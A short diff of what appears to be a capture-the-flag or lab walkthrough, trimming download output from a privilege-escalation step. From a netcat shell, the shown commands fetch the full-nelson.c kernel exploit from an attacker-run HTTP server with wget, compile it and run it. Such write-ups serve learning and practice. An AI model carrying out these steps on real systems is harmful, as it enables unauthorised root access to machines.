@@ -196,14 +196,6 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 - On netcat shell - 
 $ wget http://10.10.14.9:8000/full-nelson.c
---2022-04-20 10:12:11--  http://10.10.14.9:8000/full-nelson.c
-Connecting to 10.10.14.9:8000... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 9400 (9.2K) [text/x-csrc]
-Saving to: `full-nelson.c'
-0K .........                                             100%  648K=0.01s
-2022-04-20 10:12:11 (648 KB/s) - `full-nelson.c' saved [9400/9400]
-
 $ gcc full-nelson.c -o full-nelson
 $ chmod +x full-nelson
 $ ./full-nelson
